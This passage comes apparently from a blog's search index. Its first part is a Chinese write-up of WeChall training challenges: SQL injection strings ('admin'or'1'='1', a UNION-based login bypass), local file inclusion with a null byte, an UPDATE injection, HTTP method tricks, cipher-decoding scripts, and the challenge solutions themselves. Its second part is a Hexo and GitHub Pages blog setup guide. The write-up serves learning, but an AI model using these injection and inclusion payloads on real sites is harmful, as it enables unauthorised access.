URL%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%6D%61%69%68%68%6D%6F%62%68%69%6E%70%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21 URL编码，URL解码 Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=maihhmobhinp&amp;cid=52#password=fibre_optics Very well done! Training: WWW-Robots考察robots.txt（网络爬虫协议） http://www.wechall.net/robots.txt User-agent: * Disallow: /challenge/training/www/robots/T0PS3CR3T Prime Factory找到第一个和第二个大于1百万，并且每个位上的数字的和都是素数的素数。 代码如下： def iszhishu(n): for i in range(2,n): if n % i ==0: return False return True def sum(n): count = 0 for t in range(len(n)): count += int(n[t]) if iszhishu(count): return True else: return False for num in range(1000001,9999999): if iszhishu(num): if sum(str(num)): print(int(num)) 取前两个 1000033 1000037 PHP 0817本地文件包含，代码如下： &lt;?php if (isset($_GET[&apos;which&apos;])) { $which = $_GET[&apos;which&apos;]; switch ($which) { case 0: case 1: case 2: require_once $which.&apos;.php&apos;; break; default: echo GWF_HTML::error(&apos;PHP-0817&apos;, &apos;Hacker NoNoNo!&apos;, false); break; } } 要求是包含solution.php. http://www.wechall.net/challenge/php0817/index.php?which=solution Training: MySQL I简单的sql注入 万能密钥： admin’or’1’=’1 Training: Programming 1就是一个简单的post数据包。 就是先获取生成随机数那个页面的 http 头。然后把自己的 Cookie 加上去。 然后请求这个页面，得到字符串，将其拼接在提交页面的 url 上。 再请求提交页面的 http 头，并添加自己的 Cookie，最后请求即可。 Warning: 这个网站在国外，但是打开一个页面就要 1 秒多。所以国内跑这个脚本肯定超时。这时候你就需要一台国外服务器来跑这个脚本。 Training: PHP LFI本地文件包含+零零截断。 源码如下： $filename = &apos;pages/&apos;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).&apos;.html&apos;; include $filename; 会在file的前面加上pages/后面加上welcome 所以结果就是：pages/file.html 所以构造如下代码： http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00 Training: Encodings I本来按照正常思路是先8个8个一组，分到最后发现不对，不是8的倍数。然后百度，原来重点是提示的：English。 英文字母所用的ascii字符只占用七个bit（即7位） 脚本如下： str1=&quot;101010011010001101001111001101000001110100110010111110001110100010000011010011110011010000001101110101101110001011010011110100010000011001011101110110001111011111100100110010111001000100000110000111100111100011110100111010010101110010000010110011101111111010111100100100000111000011000011110011111001111101111101111111001011001000100000110100111100110100000110010111000011110011111100111100111110100110000111100101110100110010111100100101110&quot; print len(str1) def res(str1): length = len(str1) for i in range(length/7): yield str1[i*7:(i+1)*7] s=&quot;&quot; for r in res(str1): s += chr(int(r,2)) //将二进制的字符串变成整形的十进制 print s yield关键字用来定义生成器（Generator），其具体功能是可以当return使用，从函数里返回一个值，不同之处是用yield返回之后，可以让函数从上回yield返回的地点继续执行。也就是说，yield返回函数，交给调用者一个返回值，然后再“瞬移”回去，让函数继续运行， 直到吓一跳yield语句再返回一个新的值。 int(r,2)2是表示转化为十进制，默认的是0 This text is 7-bit encoded ascii. Your password is easystarter. Training: Crypto - Transposition I置换密码：就是明文的字母保持相同，但顺序被打乱了。 密文如下： oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt oes eoyrup sawsro don:wa nrrabflmag.b 脚本如下： s=&apos;oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt oes eoyrup sawsro don:wa msmniaocam.d&apos; for i in range(0,len(s),2): res=&apos;&apos; t= (s[i + 1] + s[i]) res +=t print res 说明：字符串的长度为148，所以可以换的话就有： 两两互换即o，W互换，d，n互换…共74对 四四互换即oWdn，reuf互换，.lY ，uoc 互换…共37对 37,37互换… 74,74互换… Wonderful. You can read the message way better when the letters are in correct order. I think you would like to see your password now: asmnmaicomad. Training: Register GlobalsPHP全局变量 源码如下： ... if (isset($login)) { echo GWF_HTML::message(&apos;Register Globals&apos;, $chall-&gt;lang(&apos;msg_welcome_back&apos;, array(htmlspecialchars($login[0]), htmlspecialchars($login[1])))); if (strtolower($login[0]) === &apos;admin&apos;) { $chall-&gt;onChallengeSolved(GWF_Session::getUserID()); } ... 代码中检测login，如果login[0]=’admin’输出信息。 构造代码如下： http://www.wechall.net/challenge/training/php/globals/globals.php?login[0]=admin No Escapeupdate注入 如果一直点一个人的话，会一直增长，如果有人达到100，所有人重置。 执行以下代码： http://www.wechall.net/challenge/no_escape/index.php?vote_for=bil 回显为： GDO Error(1054): Unknown column ‘bil’ in ‘field list’UPDATE noescvotes SET bil=bil+1 WHERE id=1 构造如下语句： bill`=111%23 则sql语句为： UPDATE noescvotes SET bill=111%23=bill`+1 WHERE id=1 构造URL： http://www.wechall.net/challenge/no_escape/?vote_for=bill`=111%23 Training: Crypto - Substitution I单表置换密码 密文如下： DK OAM VTFXLAOK LIG KIQ PVE BMVG OAXH FK RBXMEG X VF XFZBMHHMG YMBK CMTT GIEM KIQB HITQOXIE UMK XH ZMFLMZXAFEXL OAXH TXOOTM PAVTTMELM CVH EIO OII AVBG CVH XO 密钥短语密码就是选一个英文短语作为密钥字(Key Word)或密钥短语(Key Phrase)，如HAPPY NEW YEAR，去掉重复字母得HAPYNEWR。将它依次写在明文字母表之下，而后再将字母表中未在短语中出现过的字母依次写于此短语之后，就可构造出一个字母代换表： 对照表就行了。 免费破解地址 BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS PEMGEPIHMNIG THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT hi说了那么多屁话，就是一个等差数列。 第一分钟是2，以后依次加一，最后一项是17591026060781 所以总共有(2+17591026060781)*17591026060781/2 发现结果竟然是小数，改为(2+17591026060782)*17591026060782/2竟然对了。。。 Training: MySQL II.htaccess username password分开来验证。通常的利用方法是使用union构造已知MD5值的查询。 构造语句： username=-1&apos; union select 1,&apos;admin&apos;,&apos;e10adc3949ba59abbe56e057f20f883e&apos; %23&amp;password=123456&amp;login=Login 这句话首先通过username=-1将原语句报错。因此返回的将会是第二条语句产生的信息。而我们union select的是直接构造了用户名为admin，密码为123456的md5值。这样就可以让程序误认为我们构造的信息就是它从数据库里面提取得到的信息。 Limited Access让我们访问.htaccess 源码如下： AuthUserFile .htpasswd AuthGroupFile /dev/null AuthName &quot;Authorization Required for the Limited Access Challenge&quot; AuthType Basic &lt;Limit GET&gt;require valid-user &lt;/Limit&gt; 源码中限制了GET 所以使用post即可 Training: Regex正则表达式 匹配一个空字符就行了。 正则表达式匹配空值方式如下： \b 匹配单词开头或结尾位置 ^ 匹配字符串开端位置 $ 匹配字符串结尾位置 \s 匹配一切空白字符 \n 匹配换行 代码如下： /^$/ Training: Crypto - Caesar IIs = &apos;77 1F 1F 14 20 1A 1F 12 5C 20 29 1F 25 20 23 1F 1C 26 15 14 20 1F 1E 15 20 1D 1F 22 15 20 13 18 11 1C 1C 15 1E 17 15 20 19 1E 20 29 1F 25 22 20 1A 1F 25 22 1E 15 29 5E 20 04 18 19 23 20 1F 1E 15 20 27 11 23 20 16 11 19 22 1C 29 20 15 11 23 29 20 24 1F 20 13 22 11 13 1B 5E 20 07 11 23 1E 57 24 20 19 24 6F 20 61 62 68 20 1B 15 29 23 20 19 23 20 11 20 21 25 19 24 15 20 23 1D 11 1C 1C 20 1B 15 29 23 20 11 13 15 5C 20 23 1F 20 19 24 20 23 18 1F 25 1C 14 1E 57 24 20 18 11 26 15 20 24 11 1B 15 1E 20 29 1F 25 20 24 1F 1F 20 1C 1F 1E 17 20 24 1F 20 14 15 13 22 29 20 24 20 24 18 19 23 20 1D 15 23 23 11 17 15 5E 20 07 15 1C 1C 20 14 1F 1E 15 5C 20 29 1F 25 22 20 23 1F 1C 25 24 19 1F 1E 20 19 23 20 1D 20 23 11 22 22 15 23 20 1D 1E 17 5E&apos; s = s.split() for key in range(0,128+1,1): for i in s: i = int(i,16) print (chr((i + key + 256) % 256 ), end = &apos;&apos;) print (key) key=80时 Çoodpjob¬pyoupsolvedponepmorepchallengepinpyourpjourney®pThisponepwaspfairlypeasyptopcrack®pWasn§tpit¿p±²¸pkeyspispapquitepsmallpkeyspace¬psopitpshouldn§tphaveptakenpyouptooplongptopdecryptpthispmessage®pWellpdone¬pyourpsolutionpispmpsarrespmng® Stegano Attachment下载图片之后，notepad打开 发现：solution.txt 改后缀为rar IDSRGRNENMPS Training: LSB放入神器stegsolve中 CBNMGNBFMOHN Limited Access Too访问.htaccess发现几乎过滤了所有方法 GET POST HEAD PUT DELETE CONNECT OPTIONS php会将TO方法给解析成GET方法。那么我们就可以抓包，改为TO 使用move方法 PHP 0815源码如下： &lt;? $whitelist = array(1, 2, 3); if (false === ($show = isset($_GET[&apos;show&apos;]) ? $_GET[&apos;show&apos;] : false)) { die(&apos;MISSING PARAMETER; USE foo.bar?show=[1-3]&apos;); } elseif (in_array($show, $whitelist)){ $query = &quot;SELECT 1 FROM `table` WHERE `id`=$show&quot;; echo &apos;Query: &apos;.htmlspecialchars($query, ENT_QUOTES).&apos;&lt;br/&gt;&apos;; die(&apos;SHOWING NUMBER &apos;.htmlspecialchars($show, ENT_QUOTES)); }else { die(&apos;HACKER NONONO&apos;); } 这明显是SQL注入，但是防注入的方法有很多，需要找到最简单的，于是找到一个方法： 将传入的参数需要转换成整数。 通常所用的函数是int()或者intval() 然而出于php wtf的atoi转换规则，$show-0足以完成 htmlspecialchars这题是xss，借这个，再写一篇xss的总结。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>writeup</tag>
        <tag>WeChall</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Github+Hexo搭建独立博客]]></title>
    <url>%2F2015%2F09%2F13%2F%E4%BD%BF%E7%94%A8Github-Hexo%E6%90%AD%E5%BB%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[应用GitHub Pages创建属于自己的个人博客，GitHub将提供免费的空间。GitHub提供的域名（用户名+github+io）,在Repository name对应处填写资源名，其需要使用自己的用户名，每个用户名下面只能建立一个，并且资源命名必须符合这样的规则username/username.github.io，之后勾选下面的”Initialize this repository with a README” 安装准备环境搭建： Node.js：下载地址 Git：下载地址#GitHub注册与配置 注册地址 具体配置及使用请参照：使用Github Pages搭建独立博客 配置并添加SSH KEY到Github 测试 可以输入下面的命令，看看设置是否成功，git@github.com的部分不要修改： $ ssh -T git@github.com 如果是下面的反馈： The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.Are you sure you want to continue connecting (yes/no)? 不要紧张，输入yes就好，然后会看到： Hi cnfeat! You’ve successfully authenticated,but GitHub does not provide shell access. 设置用户信息：现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。 $ git config –global user.name “cnfeat”//用户名$ git config –global user.email “cnfeat@gmail.com”//填写自己的邮箱 SSH Key配置成功，本机已成功连接到github. HexoHexo是一个简单、快速、强大的博客发布工具，支持Markdown格式。 安装新建一个文档 当作博客根目录（尽量不要有中文），在此目录下打开Git Bash（前提确保Node.js已经安装，环境配置OK） $ npm install -g hexo $ hexo init $ hexo generate $ hexo server 打开本地http://localhost:4000/你就可以看到hexo网站了。 注： hexo server启动之后无法访问：使用-p参数改端口 npm命令找不到：使用npm.cmd,或者卸载重装 git命令找不到：git init先初始化部署到GitHub编辑hexo目录下的_config.yml（此文件为你网站的配置文件) 修改代码如下：123type: gitrepository: http://github.com/drops123456/drops123456.github.io.git branch: master 然后执行： hexo g 编译生成静态文件 hexo d 发布到Github 访问：http://username.github.io/即可看到网站。 如果需要使用别的域名，在根目录下创建文件CNAME内容为你的域名即可（关于A记录和CNAME，请参考：域名解析的区别） clone主题选择一个主题 使用命令 git clone http://example.com 下载zip包 在把下载的主题拷贝到hexo/themes目录下，配置_config.yml theme: yelee 部署主题$ hexo g #生成 $ hexo s #启动本地服务，进行文章预览调试 实例example以我的网站的配置，如下： # Hexo Configuration ## Docs: https://hexo.io/docs/configuration.html ## Source: https://github.com/hexojs/hexo/ # Site title: Joy_nick subtitle: No pains, No gains！ description: No pains, No gains！ author: Joy_nick language: zh-CN timezone: # URL ## If your site is put in a subdirectory, set url as &apos;http://yoursite.com/child&apos; and root as &apos;/child/&apos; url: http://byd.dropsec.xyz root: / permalink: :year/:month/:day/:title/ permalink_defaults: # Directory source_dir: source public_dir: public tag_dir: tags archive_dir: archives category_dir: categories code_dir: downloads/code i18n_dir: :lang skip_render: # Writing new_post_name: :title.md # File name of new posts default_layout: post titlecase: false # Transform title into titlecase external_link: true # Open external links in new tab filename_case: 0 render_drafts: false post_asset_folder: false relative_link: false future: true highlight: enable: true line_number: true auto_detect: false tab_replace: # Category &amp; Tag default_category: uncategorized category_map: tag_map: # Date / Time format ## Hexo uses Moment.js to parse and display date ## You can customize the date format as defined in ## http://momentjs.com/docs/#/displaying/format/ date_format: YYYY-MM-DD time_format: HH:mm:ss # Pagination ## Set per_page to 0 to disable pagination per_page: 8 pagination_dir: page # Extensions ## Plugins: https://hexo.io/plugins/ ## Themes: https://hexo.io/themes/ theme: yelee feed: #之后配置rss会用，使用如下配置即可 type: atom path: atom.xml limit: 20 # Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repository: http://github.com/drops123456/drops123456.github.io.git branch: master 发布新的文章 cd到网站根目录下 $ hexo new “My New Post” [info] File created at d:\Hexo\source_posts\My-New-Post.md 编译生成静态文件 hexo g 部署到Github hexo d也可以使用命令：hexo g -d 注：建议每次部署前，先本地查看 命令总结hexo n == hexo new hexo g == hexo generate hexo s == hexo server hexo d == hexo deploy hexo new &quot;postName&quot; #新建文章 hexo new page &quot;pageName&quot; #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server） hexo deploy #将.deploy目录部署到GitHub hexo help # 查看帮助 hexo version #查看Hexo的版本]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
